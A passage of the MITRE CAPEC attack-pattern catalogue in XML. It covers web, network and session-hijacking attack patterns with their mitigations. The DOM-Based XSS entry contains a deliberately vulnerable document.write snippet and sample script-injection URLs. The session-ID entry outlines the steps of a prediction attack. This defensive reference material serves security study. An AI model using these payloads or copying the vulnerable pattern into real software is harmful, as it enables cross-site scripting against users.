            <Mitigation>Changes to registry entries in "HKLM\Software\Microsoft\Windows NT\Winlogon\Notify" that do not correlate with known software, patch cycles, etc are suspicious. New DLLs written to System32 which do not correlate with known good software or patching may be suspicious.</Mitigation>
         </Mitigations>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1004</Entry_ID>
               <Entry_Name>Winlogon helper DLL</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2015-11-09</Submission_Date>
            </Submission>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="58" Name="Restful Privilege Elevation" Abstraction="Detailed" Status="Draft">
         <Description>Rest uses standard HTTP (Get, Put, Delete) style permissions methods, but these are not necessarily correlated generally with back end programs. Strict interpretation of HTTP get methods means that these HTTP Get services should not be used to delete information on the server, but there is no access control mechanism to back up this logic. This means that unless the services are properly ACL'd and the application's service implementation are following these guidelines then an HTTP request can easily execute a delete or update on the server side. The attacker identifies a HTTP Get URL such as http://victimsite/updateOrder, which calls out to a program to update orders on a database or other resource. The URL is not idempotent so the request can be submitted multiple times by the attacker, additionally, the attacker may be able to exploit the URL published as a Get method that actually performs updates (instead of merely retrieving data). This may result in malicious or inadvertent altering of data on the server.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="1"/>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="233"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The attacker needs to be able to identify HTTP Get URLs. The Get methods must be set to call applications that perform operations other than get such as update and delete.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">It is relatively straightforward to identify an HTTP Get method that changes state on the server side and executes against an over-privileged system interface</Skill>
         </Skills_Required>
         <Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Design: Enforce principle of least privilege</Mitigation>
            <Mitigation>Implementation: Ensure that HTTP Get methods only retrieve state and do not alter state on the server side</Mitigation>
            <Mitigation>Implementation: Ensure that HTTP methods have proper ACLs based on what the functionality they expose</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>The HTTP Get method is designed to retrieve resources and not to alter the state of the application or resources on the server side. However, developers can easily code programs that accept a HTTP Get request that do in fact create, update or delete data on the server. Both Flickr (http://www.flickr.com/services/api/flickr.photosets.delete.html) and del.icio.us (http://del.icio.us/api/posts/delete) have implemented delete operations using standard HTTP Get requests. These HTTP Get methods do delete data on the server side, despite being called from Get which is not supposed to alter state.</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="267"/>
            <Related_Weakness CWE_ID="269"/>
            <Related_Weakness CWE_ID="264"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-463"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="580" Name="Application Footprinting" Abstraction="Standard" Status="Stable">
         <Description>An adversary engages in active probing and exploration activities to determine the type or version of an application installed on a remote target. This differs from fingerprinting where the attacker's action is passive through the examination of application output.</Description>
         <Likelihood_Of_Attack>Low</Likelihood_Of_Attack>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="169">
               <Exclude_Related Exclude_ID="512"/>
            </Related_Attack_Pattern>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The adversary must have logical access to the target network and system.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">The adversary needs to know basic linux commands.</Skill>
         </Skills_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Keep patches up to date by installing weekly or daily if possible.</Mitigation>
            <Mitigation>Identify programs that may be used to acquire peripheral information and block them by using a software restriction policy or tools that restrict program execution by process whitelisting.</Mitigation>
         </Mitigations>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2015-11-09</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit, Typical_Severity</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="581" Name="Security Software Footprinting" Abstraction="Detailed" Status="Draft">
         <Description>Adversaries may attempt to get a listing of security tools that are installed on the system and their configurations. This may include security related system features (such as a built-in firewall or anti-spyware) as well as third-party security software.</Description>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="580"/>
         </Related_Attack_Patterns>
         <Mitigations>
            <Mitigation>Identify programs that may be used to acquire security tool information and block them by using a software restriction policy or tools that restrict program execution by process whitelisting.</Mitigation>
         </Mitigations>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1063</Entry_ID>
               <Entry_Name>Security Software Discovery</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2015-11-09</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated References</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="582" Name="Route Disabling" Abstraction="Standard" Status="Draft">
         <Description>An adversary disables the network route between two targets. The goal is to completely sever the communications channel between two entities. This is often the result of a major error or the use of an "Internet kill switch" by those in control of critical infrastructure. This attack pattern differs from most other obstruction patterns by targeting the route itself, as opposed to the data passed over the route.</Description>
         <Likelihood_Of_Attack>Low</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="607"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The adversary requires knowledge of and access to network route.</Prerequisite>
         </Prerequisites>
         <Consequences>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>Other</Impact>
               <Note>Disabling a network route denies the availability of a service.</Note>
            </Consequence>
         </Consequences>
         <Content_History>
            <Submission>
               <Submission_Name>Seamus Tuohy</Submission_Name>
               <Submission_Date>2017-02-14</Submission_Date>
            </Submission>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="583" Name="Disabling Network Hardware" Abstraction="Detailed" Status="Draft">
         <Description>In this attack pattern, an adversary physically disables networking hardware by powering it down or disconnecting critical equipment. Disabling or shutting off critical system resources prevents them from performing their service as intended, which can have direct and indirect consequences on other systems. This attack pattern is considerably less technical than the selective blocking used in most obstruction attacks.</Description>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="582">
               <Exclude_Related Exclude_ID="512"/>
            </Related_Attack_Pattern>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The adversary requires physical access to the targeted communications equipment (networking devices, cables, etc.), which may be spread over a wide area.</Prerequisite>
         </Prerequisites>
         <Consequences>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>Other</Impact>
               <Note>Denial of Service</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Ensure rigorous physical defensive measures to keep the adversary from accessing critical systems..</Mitigation>
         </Mitigations>
         <References>
            <Reference External_Reference_ID="REF-464"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>Seamus Tuohy</Submission_Name>
               <Submission_Date>2017-01-12</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="584" Name="BGP Route Disabling" Abstraction="Detailed" Status="Draft">
         <Description>An adversary suppresses the Border Gateway Protocol (BGP) advertisement for a route so as to render the underlying network inaccessible. The BGP protocol helps traffic move throughout the Internet by selecting the most efficient route between Autonomous Systems (AS), or routing domains. BGP is the basis for interdomain routing infrastructure, providing connections between these ASs. By suppressing the intended AS routing advertisements and/or forcing less effective routes for traffic to ASs, the adversary can deny availability for the target network.</Description>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="582"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The adversary must have control of a router that can modify, drop, or introduce spoofed BGP updates.The adversary can convince</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>BGP Router</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>Other</Impact>
               <Note>Disabling a network route at the routing infrastructure level denies availability of that route.</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>
               <xhtml:p>Implement Ingress filters to check the validity of received routes. However, this relies on the accuracy of Internet Routing Registries (IRRs) databases which are often not well-maintained.</xhtml:p>
               <xhtml:p>Implement Secure BGP (S-BGP protocol), which improves authorization and authentication capabilities based on public-key cryptography.</xhtml:p>
            </Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>Blackholing: The adversary intentionally references false routing advertisements in order to attract traffic to a particular router so it can be dropped.</Example>
         </Example_Instances>
         <References>
            <Reference External_Reference_ID="REF-465"/>
            <Reference External_Reference_ID="REF-466"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>Seamus Tuohy</Submission_Name>
               <Submission_Date>2017-01-12</Submission_Date>
            </Submission>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="585" Name="DNS Domain Seizure" Abstraction="Detailed" Status="Draft">
         <Description>In this attack pattern, an adversary influences a target's web-hosting company to disables a target domain. The goal is to prevent access to the targeted service provided by that domain. It usually occurs as the result of civil or criminal legal interventions.</Description>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="582"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>This attack pattern requires that the adversary has cooperation from the registrar of the target domain.</Prerequisite>
         </Prerequisites>
         <Consequences>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>Other</Impact>
               <Note>Disabling a target domain at the infrastructure level denies the availability of its service to the user.</Note>
            </Consequence>
         </Consequences>
         <Example_Instances>
            <Example>The FBI's seizure of gambling websites, the US DOJ's seizure of child pornography websites, and Microsoft's seizure of all domains owned by the company No-IP in order to disrupt a cyberattack originating from a subset of those domains.</Example>
         </Example_Instances>
         <References>
            <Reference External_Reference_ID="REF-467"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>Seamus Tuohy</Submission_Name>
               <Submission_Date>2017-01-12</Submission_Date>
            </Submission>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="586" Name="Object Injection" Abstraction="Meta" Status="Draft">
         <Description>An adversary attempts to exploit an application by injecting additional, malicious content during its processing of serialized objects. Developers leverage serialization in order to convert data or state into a static, binary format for saving to disk or transferring over a network. These objects are then deserialized when needed to recover the data/state. By injecting a malformed object into a vulnerable application, an adversary can potentially compromise the application by manipulating the deserialization process. This can result in a number of unwanted outcomes, including remote code execution.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Prerequisites>
            <Prerequisite>The target application must unserialize data before validation.</Prerequisite>
         </Prerequisites>
         <Consequences>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>Resource Consumption</Impact>
               <Note>If a function is making an assumption on when to terminate, based on a sentry in a string, it could easily never terminate and exhaust available resources.</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Data</Impact>
               <Note>Attackers can modify objects or data that was assumed to be safe from modification.</Note>
            </Consequence>
            <Consequence>
               <Scope>Authorization</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
               <Note>Functions that assume information in the deserialized object is valid could be exploited.</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>
               <xhtml:p>Implementation: Validate object before deserialization process</xhtml:p>
               <xhtml:p>Design: Limit which types can be deserialized.</xhtml:p>
               <xhtml:p>Implementation: Avoid having unnecessary types or gadgets available that can be leveraged for malicious ends. Whitelist acceptable classes.</xhtml:p>
               <xhtml:p>Implementation: Keep session state on the server, when possible.</xhtml:p>
            </Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="502"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-468"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2017-02-06</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated References, Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="587" Name="Cross Frame Scripting (XFS)" Abstraction="Standard" Status="Draft">
         <Description>This attack pattern combines malicious Javascript and a legitimate webpage loaded into a concealed iframe. The malicious Javascript is then able to interact with a legitimate webpage in a manner that is unknown to the user. This attack usually leverages some element of social engineering in that an attacker must convinces a user to visit a web page that the attacker controls.</Description>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="195">
               <Exclude_Related Exclude_ID="512"/>
            </Related_Attack_Pattern>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The user's browser must have vulnerabilities in its implementation of the same-origin policy. It allows certain data in a loaded page to originate from different servers/domains.</Prerequisite>
         </Prerequisites>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
               <Note>Cross Frame Scripting allows an adversary to steal sensitive data from a legitimate site.</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>
               <xhtml:p>Avoid clicking on untrusted links.</xhtml:p>
               <xhtml:p>Employ techniques such as frame busting, which is a method by which developers aim to prevent their site being loaded within a frame.</xhtml:p>
            </Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>An adversary-controlled webpage contains malicious Javascript and a concealed iframe containing containing a legitimate website login (i.e., the concealed iframe would make it appear as though the actual legitimate website was loaded). When the user interacts with the legitimate website in the iframe, the malicious Javascript collects that sensitive information.</Example>
         </Example_Instances>
         <References>
            <Reference External_Reference_ID="REF-469"/>
            <Reference External_Reference_ID="REF-470"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2017-02-01</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="588" Name="DOM-Based XSS" Abstraction="Detailed" Status="Stable">
         <Description>This type of attack is a form of Cross-Site Scripting (XSS) where a malicious script is inserted into the client-side HTML being parsed by a web browser. Content served by a vulnerable web application includes script code used to manipulate the Document Object Model (DOM). This script code either does not properly validate input, or does not perform proper output encoding, thus creating an opportunity for an adversary to inject a malicious script launch a XSS attack. A key distinction between other XSS attacks and DOM-based attacks is that in other XSS attacks, the malicious script runs when the vulnerable web page is initially loaded, while a DOM-based attack executes sometime after the page loads. Another distinction of DOM-based attacks is that in some cases, the malicious script is never sent to the vulnerable web server at all. An attack like this is guaranteed to bypass any server-side filtering attempts to protect users.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>Very High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="63"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>An application that leverages a client-side web browser with scripting enabled.</Prerequisite>
            <Prerequisite>An application that manipulates the DOM via client-side scripting.</Prerequisite>
            <Prerequisite>An application that failS to adequately sanitize or encode untrusted input.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Medium">Requires the ability to write scripts of some complexity and to inject it through user controlled fields in the system.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>None: No specialized resources are required to execute this type of attack.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
               <Note>A successful DOM-based XSS attack can enable an adversary to exfiltrate sensitive information from the application.</Note>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Authorization</Scope>
               <Scope>Access Control</Scope>
               <Impact>Gain Privileges</Impact>
               <Note>A successful DOM-based XSS attack can enable an adversary to elevate their privilege level and access functionality they should not otherwise be allowed to access.</Note>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
               <Note>A successful DOM-based XSS attack can enable an adversary run arbitrary code of their choosing, thus enabling a complete compromise of the application.</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Data</Impact>
               <Note>A successful DOM-based XSS attack can allow an adversary to tamper with application data.</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Use browser technologies that do not allow client-side scripting.</Mitigation>
            <Mitigation>Utilize proper character encoding for all output produced within client-site scripts manipulating the DOM.</Mitigation>
            <Mitigation>Ensure that all user-supplied input is validated before use.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>
               <xhtml:p>Consider a web application that enables or disables some of the fields of a form on the page via the use of a mode parameter provided on the query string.</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="informative">http://my.site.com/aform.html?mode=full</xhtml:div>
               <xhtml:p>The application’s client-side code may want to print this mode value to the screen to give the users an understanding of what mode they are in. In this example, JavaScript is used to pull the value from the URL and update the HTML by dynamically manipulating the DOM via a document.write() call.</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="informative">&lt;script&gt;document.write("&lt;p&gt;Mode is: " + document.location.href.substring(document.location.href.indexOf('mode=') + 5) + "&lt;/p&gt;");&lt;/script&gt;</xhtml:div>
               <xhtml:p>Notice how the value provided on the URL is used directly with no input validation performed and no output encoding in place. A maliciously crafted URL can thus be formed such that if a victim clicked on the URL, a malicious script would then be executed by the victim’s browser:</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="attack">http://my.site.com/aform.html?mode=&lt;script&gt;alert('hi');&lt;/script&gt;</xhtml:div>
            </Example>
            <Example>
               <xhtml:p>In some DOM-based attacks, the malicious script never gets sent to the web server at all, thus bypassing any server-side protections that might be in place. Consider the previously used web application that displays the mode value. Since the HTML is being generated dynamically through DOM manipulations, a URL fragment (i.e., the part of a URL after the '#' character) can be used.</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="attack">http://my.site.com/aform.html#mode=&lt;script&gt;alert('hi')&lt;/script&gt;</xhtml:div>
               <xhtml:p>In this variation of a DOM-based XSS attack, the malicious script will not be sent to the web server, but will instead be managed by the victim's browser and is still available to the client-side script code.</xhtml:p>
            </Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="79"/>
            <Related_Weakness CWE_ID="20"/>
            <Related_Weakness CWE_ID="83"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-471"/>
            <Reference External_Reference_ID="REF-472"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2017-04-15</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Resources_Required</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="589" Name="DNS Blocking" Abstraction="Detailed" Status="Draft">
         <Description>An adversary intercepts traffic and intentionally drops DNS requests based on content in the request. In this way, the adversary can deny the availability of specific services or content to the user even if the IP address is changed.</Description>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="603">
               <Exclude_Related Exclude_ID="514"/>
            </Related_Attack_Pattern>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>This attack requires the ability to conduct deep packet inspection with an In-Path device that can drop the targeted traffic and/or connection.</Prerequisite>
         </Prerequisites>
         <Consequences>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>Other</Impact>
               <Note>Preventing DNS from resolving a request denies the availability of a target site or service for the user.</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>
               <xhtml:p>Hard Coded Alternate DNS server in applications</xhtml:p>
               <xhtml:p>Avoid dependence on DNS</xhtml:p>
               <xhtml:p>Include "hosts file"/IP address in the application</xhtml:p>
               <xhtml:p>Ensure best practices with respect to communications channel protections.</xhtml:p>
               <xhtml:p>Use a .onion domain with Tor support</xhtml:p>
            </Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>
               <xhtml:p>Full URL Based Filtering: Filtering based upon the requested URL.</xhtml:p>
               <xhtml:p>URL String-based Filtering: Filtering based upon the use of particular strings included in the requested URL.</xhtml:p>
            </Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="300"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-473"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>Seamus Tuohy</Submission_Name>
               <Submission_Date>2017-01-12</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns, Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="59" Name="Session Credential Falsification through Prediction" Abstraction="Detailed" Status="Draft">
         <Description>This attack targets predictable session ID in order to gain privileges. The attacker can predict the session ID used during a transaction to perform spoofing and session hijacking.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="196"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Find Session IDs] The attacker interacts with the target host and finds that session IDs are used to authenticate users.</Description>
               <Technique>An attacker makes many anonymous connections and records the session IDs assigned.</Technique>
               <Technique>An attacker makes authorized connections and records the session tokens or credentials issued.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Explore</Phase>
               <Description>[Characterize IDs] The attacker studies the characteristics of the session ID (size, format, etc.). As a results the attacker finds that legitimate session IDs are predictable.</Description>
               <Technique>Cryptanalysis. The attacker uses cryptanalysis to determine if the session IDs contain any cryptographic protections.</Technique>
               <Technique>Pattern tests. The attacker looks for patterns (odd/even, repetition, multiples, or other arithmetic relationships) between IDs</Technique>
               <Technique>Comparison against time. The attacker plots or compares the issued IDs to the time they were issued to check for correlation.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Experiment</Phase>
               <Description>[Match issued IDs] The attacker brute forces different values of session ID and manages to predict a valid session ID.</Description>
               <Technique>The attacker models the session ID algorithm enough to produce a compatible session IDs, or just one match.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>4</Step>
               <Phase>Exploit</Phase>
               <Description>[Use matched Session ID] The attacker uses the falsified session ID to access the target system.</Description>
               <Technique>The attacker loads the session ID into his web browser and browses to restricted data or functionality.</Technique>
               <Technique>The attacker loads the session ID into his network communications and impersonates a legitimate user to gain access to data or functionality.</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>The target host uses session IDs to keep track of the users.</Prerequisite>
            <Prerequisite>Session IDs are used to control access to resources.</Prerequisite>
            <Prerequisite>The session IDs used by the target host are predictable. For example, the session IDs are generated using predictable information (e.g., time).</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">There are tools to brute force session ID. Those tools require a low level of knowledge.</Skill>
            <Skill Level="Medium">Predicting Session ID may require more computation work which uses advanced analysis such as statistical analysis.</Skill>
         </Skills_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Use a strong source of randomness to generate a session ID.</Mitigation>
            <Mitigation>Use adequate length session IDs</Mitigation>
            <Mitigation>Do not use information available to the user in order to generate session ID (e.g., time).</Mitigation>
            <Mitigation>Ideas for creating random numbers are offered by Eastlake [RFC1750]</Mitigation>
            <Mitigation>Encrypt the session ID if you expose it to the user. For instance session ID can be stored in a cookie in encrypted format.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>Jetty before 4.2.27, 5.1 before 5.1.12, 6.0 before 6.0.2, and 6.1 before 6.1.0pre3 generates predictable session identifiers using java.util.random, which makes it easier for remote attackers to guess a session identifier through brute force attacks, bypass authentication requirements, and possibly conduct cross-site request forgery attacks. See also: CVE-2006-6969</Example>
            <Example>mod_usertrack in Apache 1.3.11 through 1.3.20 generates session ID's using predictable information including host IP address, system time and server process ID, which allows local users to obtain session ID's and bypass authentication when these session ID's are used for authentication. See also: CVE-2001-1534</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="290"/>
            <Related_Weakness CWE_ID="330"/>
            <Related_Weakness CWE_ID="331"/>
            <Related_Weakness CWE_ID="346"/>
            <Related_Weakness CWE_ID="488"/>
            <Related_Weakness CWE_ID="539"/>
            <Related_Weakness CWE_ID="200"/>
            <Related_Weakness CWE_ID="6"/>
            <Related_Weakness CWE_ID="285"/>
            <Related_Weakness CWE_ID="384"/>
            <Related_Weakness CWE_ID="693"/>
            <Related_Weakness CWE_ID="719"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-1"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="590" Name="IP Address Blocking" Abstraction="Detailed" Status="Draft">
         <Description>An adversary performing this type of attack drops packets destined for a target IP address. The aim is to prevent access to the service hosted at the target IP address.</Description>
         <Likelihood_Of_Attack>Low</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="603">
               <Exclude_Related Exclude_ID="514"/>
            </Related_Attack_Pattern>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>This attack requires the ability to conduct deep packet inspection with an In-Path device that can drop the targeted traffic and/or connection.</Prerequisite>
